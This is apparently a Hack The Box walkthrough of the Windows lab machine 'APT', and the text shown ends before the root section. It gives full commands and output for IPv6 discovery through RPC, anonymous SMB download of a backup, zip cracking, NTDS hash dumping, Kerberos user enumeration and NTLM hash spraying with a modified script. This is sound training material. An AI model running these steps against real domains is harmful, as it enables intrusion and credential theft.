---
title: "[HTB] Machine: APT"
description: "[HTB] Machine: APT"
date: 2023-10-04
menu:
  sidebar:
    name: "[HTB] Machine: APT"
    identifier: htb-machine-APT
    parent: htb-machines-windows
    weight: 10
hero: images/apt.png
tags: ["HTB"]
---

# APT
## Enumeration
- `nmap`
```
└─$ nmap -Pn -p- 10.10.10.213 --min-rate 10000
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-07 17:44 BST
Nmap scan report for 10.10.10.213 (10.10.10.213)
Host is up (0.14s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT    STATE SERVICE
80/tcp  open  http
135/tcp open  msrpc

Nmap done: 1 IP address (1 host up) scanned in 61.36 seconds

```
```
└─$ nmap -Pn -p80,135 -sC -sV 10.10.10.213 --min-rate 10000
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-07 17:47 BST
Nmap scan report for 10.10.10.213 (10.10.10.213)
Host is up (0.14s latency).

PORT    STATE SERVICE VERSION
80/tcp  open  http    Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Gigantic Hosting | Home
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.35 seconds

```

- Web Server

![](./images/1.png)

![](./images/2.png)

- `gobuster`
```
└─$ gobuster dir -u http://10.10.10.213 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 50  -x asp,aspx,txt -k
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.213
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              asp,aspx,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 150] [--> http://10.10.10.213/images/]
/css                  (Status: 301) [Size: 147] [--> http://10.10.10.213/css/]
/js                   (Status: 301) [Size: 146] [--> http://10.10.10.213/js/]
/fonts                (Status: 301) [Size: 149] [--> http://10.10.10.213/fonts/]

```

- Check [this article](https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/service-overview-and-network-port-requirements) to see which services use which ports
- We have only `rpc` left
  - We can use `impacket-rpcmap`
    - The `-h` shows `ncacn_ip_tcp` option
    - Let's run it
```
└─$ impacket-rpcmap 'ncacn_ip_tcp:10.10.10.213'
Impacket v0.11.0 - Copyright 2023 Fortra

Procotol: N/A
Provider: rpcss.dll
UUID: 00000136-0000-0000-C000-000000000046 v0.0

Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote
Provider: rpcss.dll
UUID: 000001A0-0000-0000-C000-000000000046 v0.0

Procotol: N/A
Provider: rpcss.dll
UUID: 0B0A6584-9E0F-11CF-A3CF-00805F68CB1B v1.1

Procotol: N/A
Provider: rpcss.dll
UUID: 1D55B526-C137-46C5-AB79-638F2A68E869 v1.0

Procotol: N/A
Provider: rpcss.dll
UUID: 412F241E-C12A-11CE-ABFF-0020AF6E7A17 v0.2

Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote
Provider: rpcss.dll
UUID: 4D9F4AB8-7D1C-11CF-861E-0020AF6E7C57 v0.0

Procotol: N/A
Provider: rpcss.dll
UUID: 64FE0B7F-9EF5-4553-A7DB-9A1975777554 v1.0

Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote
Provider: rpcss.dll
UUID: 99FCFEC4-5260-101B-BBCB-00AA0021347A v0.0

Protocol: [MS-RPCE]: Remote Management Interface
Provider: rpcrt4.dll
UUID: AFA8BD80-7D8A-11C9-BEF4-08002B102989 v1.0

Procotol: N/A
Provider: rpcss.dll
UUID: B9E79E60-3D52-11CE-AAA1-00006901293F v0.2

Procotol: N/A
Provider: rpcss.dll
UUID: C6F3EE72-CE7E-11D1-B71E-00C04FC3111A v1.0

Procotol: N/A
Provider: rpcss.dll
UUID: E1AF8308-5D1F-11C9-91A4-08002B14A0FA v3.0

Procotol: N/A
Provider: rpcss.dll
UUID: E60C73E6-88F9-11CF-9AF1-0020AF6E72F4 v2.0
```

- We have bunch of `UUID`s of `rpc` endpoints
  - The defined ones are listed [here](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/c25391af-f59e-40da-885e-cc84076673e4)
  - We have `99fcfec4-5260-101b-bbcb-00aa0021347a`, which is `RPC interface UUID for IObjectExporter`
    - It is used in [Potato](https://2020.romhack.io/dl-2020/RH2020-slides-Cocomazzi.pdf) attacks
  - We can retrieve network interface information using the [IOXIDResolver](https://www.cyber.airbus.com/the-oxid-resolver-part-1-remote-enumeration-of-network-interfaces-without-any-authentication/)
    - [POC](https://github.com/mubix/IOXIDResolver/blob/master/IOXIDResolver.py)

```
└─$ python3 IOXIDResolver.py -t 10.10.10.213 
[*] Retrieving network interface of 10.10.10.213
Address: apt
Address: 10.10.10.213
Address: dead:beef::b885:d62a:d679:573f
Address: dead:beef::25bf:c0ac:e52b:c2c8
Address: dead:beef::91
```

- Let's run `nmap` against `ipv6`
```
─$ nmap -PN -6 -p- dead:beef::b885:d62a:d679:573f --min-rate 10000
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-09 19:03 BST
Nmap scan report for dead:beef::b885:d62a:d679:573f
Host is up (0.13s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
389/tcp   open  ldap
445/tcp   open  microsoft-ds
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49674/tcp open  unknown
49695/tcp open  unknown
53717/tcp open  unknown

```
```
└─$ nmap -PN -6 -p53,80,88,135,389,445,464,593,636,3268,3269,5985,9389 -sC -sV dead:beef::b885:d62a:d679:573f --min-rate 10000
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-09 19:04 BST
Nmap scan report for dead:beef::b885:d62a:d679:573f
Host is up (0.18s latency).

PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
80/tcp   open  http         Microsoft IIS httpd 10.0
|_http-title: Bad Request
| http-server-header: 
|   Microsoft-HTTPAPI/2.0
|_  Microsoft-IIS/10.0
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-10-09 18:03:38Z)
135/tcp  open  msrpc        Microsoft Windows RPC
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
|_ssl-date: 2023-10-09T18:04:32+00:00; -45s from scanner time.
| ssl-cert: Subject: commonName=apt.htb.local
| Subject Alternative Name: DNS:apt.htb.local
| Not valid before: 2020-09-24T07:07:18
|_Not valid after:  2050-09-24T07:17:18
445/tcp  open  h            Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap     Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
|_ssl-date: 2023-10-09T18:04:32+00:00; -44s from scanner time.
| ssl-cert: Subject: commonName=apt.htb.local
| Subject Alternative Name: DNS:apt.htb.local
| Not valid before: 2020-09-24T07:07:18
|_Not valid after:  2050-09-24T07:17:18
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=apt.htb.local
| Subject Alternative Name: DNS:apt.htb.local
| Not valid before: 2020-09-24T07:07:18
|_Not valid after:  2050-09-24T07:17:18
|_ssl-date: 2023-10-09T18:04:32+00:00; -45s from scanner time.
3269/tcp open  ssl/ldap     Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
|_ssl-date: 2023-10-09T18:04:32+00:00; -44s from scanner time.
| ssl-cert: Subject: commonName=apt.htb.local
| Subject Alternative Name: DNS:apt.htb.local
| Not valid before: 2020-09-24T07:07:18
|_Not valid after:  2050-09-24T07:17:18
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Bad Request
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp open  mc-nmf       .NET Message Framing
Service Info: Host: APT; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-10-09T18:04:21
|_  start_date: 2023-10-09T17:34:30
|_clock-skew: mean: -9m18s, deviation: 22m38s, median: -45s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: apt
|   NetBIOS computer name: APT\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: apt.htb.local
|_  System time: 2023-10-09T19:04:25+01:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.62 seconds

```

- `smb`
```
└─$ crackmapexec smb dead:beef::b885:d62a:d679:573f --shares -u '' -p ''
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [+] htb.local\: 
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [+] Enumerated shares
SMB         dead:beef::b885:d62a:d679:573f 445    APT              Share           Permissions     Remark
SMB         dead:beef::b885:d62a:d679:573f 445    APT              -----           -----------     ------
SMB         dead:beef::b885:d62a:d679:573f 445    APT              backup          READ            
SMB         dead:beef::b885:d62a:d679:573f 445    APT              IPC$                            Remote IPC
SMB         dead:beef::b885:d62a:d679:573f 445    APT              NETLOGON                        Logon server share 
SMB         dead:beef::b885:d62a:d679:573f 445    APT              SYSVOL                          Logon server share
```
## Foothold/User
- There is a `backup` share with `zip` file
  - Download it
```
└─$ smbclient -N //dead:beef::b885:d62a:d679:573f/backup
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Sep 24 08:30:52 2020
  ..                                  D        0  Thu Sep 24 08:30:52 2020
  backup.zip                          A 10650961  Thu Sep 24 08:30:32 2020

                5114623 blocks of size 4096. 2635438 blocks available
smb: \> get backup.zip 
```
```
└─$ impacket-smbclient dead:beef::b885:d62a:d679:573f
Impacket v0.11.0 - Copyright 2023 Fortra

Type help for list of commands
# shares
backup
IPC$
NETLOGON
SYSVOL
# use backup
# ls
drw-rw-rw-          0  Thu Sep 24 08:31:03 2020 .
drw-rw-rw-          0  Thu Sep 24 08:31:03 2020 ..
-rw-rw-rw-   10650961  Thu Sep 24 08:31:03 2020 backup.zip
# get backup.zip
```

- The archive is password-protected
```
└─$ unzip backup.zip           
Archive:  backup.zip
   creating: Active Directory/
[backup.zip] Active Directory/ntds.dit password: 
   skipping: Active Directory/ntds.dit  incorrect password
   skipping: Active Directory/ntds.jfm  incorrect password
   creating: registry/
   skipping: registry/SECURITY       incorrect password
   skipping: registry/SYSTEM         incorrect password
```

- Let's crack it
```
└─$ zip2john backup.zip > backup.hash
ver 2.0 backup.zip/Active Directory/ is not encrypted, or stored with non-handled compression type
ver 2.0 backup.zip/Active Directory/ntds.dit PKZIP Encr: cmplen=8483543, decmplen=50331648, crc=ACD0B2FB ts=9CCA cs=acd0 type=8
ver 2.0 backup.zip/Active Directory/ntds.jfm PKZIP Encr: cmplen=342, decmplen=16384, crc=2A393785 ts=9CCA cs=2a39 type=8
ver 2.0 backup.zip/registry/ is not encrypted, or stored with non-handled compression type
ver 2.0 backup.zip/registry/SECURITY PKZIP Encr: cmplen=8522, decmplen=262144, crc=9BEBC2C3 ts=9AC6 cs=9beb type=8
ver 2.0 backup.zip/registry/SYSTEM PKZIP Encr: cmplen=2157644, decmplen=12582912, crc=65D9BFCD ts=9AC6 cs=65d9 type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
```
```
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt backup.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
iloveyousomuch   (backup.zip)     
1g 0:00:00:00 DONE (2023-10-10 16:15) 100.0g/s 819200p/s 819200c/s 819200C/s newzealand..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

- Unzip the archive
```
└─$ unzip backup.zip                                         
Archive:  backup.zip
[backup.zip] Active Directory/ntds.dit password: 
  inflating: Active Directory/ntds.dit  
  inflating: Active Directory/ntds.jfm  
  inflating: registry/SECURITY       
  inflating: registry/SYSTEM 
```

- We can dump the hashes
  - There 2000 of them
```
└─$ impacket-secretsdump -system registry/SYSTEM -ntds Active\ Directory/ntds.dit LOCAL > hashes
```
```
└─$ grep ':::' hashes | wc -l                                
2000
```

- We have to check if hashes are valid  
  - But first we need to find valid users
  - We saw port `88` open, so we can use `kerbrute`
  - Add `dead:beef::b885:d62a:d679:573f apt.htb htb.local` to `/etc/hosts`
```
└─$ grep ':::' hashes | awk -F: '{print $1}' > users.list
```
```
└─$ kerbrute userenum --dc htb.local -d htb.local users.list -o valid.users.list

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/10/23 - Ronnie Flathers @ropnop

2023/10/10 16:37:27 >  Using KDC(s):
2023/10/10 16:37:27 >   htb.local:88

2023/10/10 16:37:32 >  [+] VALID USERNAME:       APT$@htb.local
2023/10/10 16:37:32 >  [+] VALID USERNAME:       Administrator@htb.local
2023/10/10 16:41:33 >  [+] VALID USERNAME:       henry.vinson@htb.local
2023/10/10 16:55:25 >  Done! Tested 2000 usernames (3 valid) in 1078.807 seconds
```

- But the hash didn't work
```
└─$ crackmapexec smb dead:beef::b885:d62a:d679:573f -u henry.vinson -H '2de80758521541d19cabba480b260e8f' 
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [-] htb.local\henry.vinson:2de80758521541d19cabba480b260e8f STATUS_LOGON_FAILURE
```
- Since `kerbrute` doesn't support hashes, we have to use [pyKerbrute](https://github.com/3gstudent/pyKerbrute)
  - I tried [smartbrute](https://github.com/ShutdownRepo/smartbrute), but it didn't work
  - We will be testing for password-reuse
  - First we retrieve `ntlm` hashes 
```
└─$ grep ':::' hashes | awk -F: '{print $4}' > ntlm.hashes
```

- I spent quite some time figuring out why my `pyKerbrute` refused to work
  - It looks like it had a pull request which changed the original crypto modules
  - Revert back to `from _crypto import ARC4, MD5, MD4`

![](./images/3.png)

- Or you can change the line `from Crypto.Cipher import MD4, MD5` to `from Crypto.Hash import MD4, MD5`
  - https://pycryptodome.readthedocs.io/en/latest/src/hash/hash.html
  - Also change the socket family from `ipv4` to `ipv6`

```
└─$ sed -i "s/AF_INET/AF_INET6/g" ADPwdSpray.py       
```

- I also had to modify the `pyKerbrute`'s `ADPwdSpray.py`
```
...
if __name__ == '__main__':
    
    domain = 'htb.local'
    username = 'henry.vinson'
    kdc_a = 'dead:beef::b885:d62a:d679:573f'
    ntlm_hashes = open(sys.argv[1], 'r').readlines()

    for ntlm in ntlm_hashes:
        ntlm = ntlm.strip('\r\n')
        user_key = (RC4_HMAC, ntlm.decode('hex'))
        passwordspray_tcp(domain, username, user_key, kdc_a, ntlm)

```

- Now start the script
  - It could 10-20 minutes
```
└─$ python2.7 ./ADPwdSpray.py ntlm.hashes
[+] Valid Login: henry.vinson:e53d87d42adaa3ca32bdb34a876cbffb
```

- Check if hash is valid
```
└─$ crackmapexec smb dead:beef::b885:d62a:d679:573f -u henry.vinson -H 'e53d87d42adaa3ca32bdb34a876cbffb'             
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [+] htb.local\henry.vinson:e53d87d42adaa3ca32bdb34a876cbffb 
```

- But the user doesn't have `winrm` permissions

## Root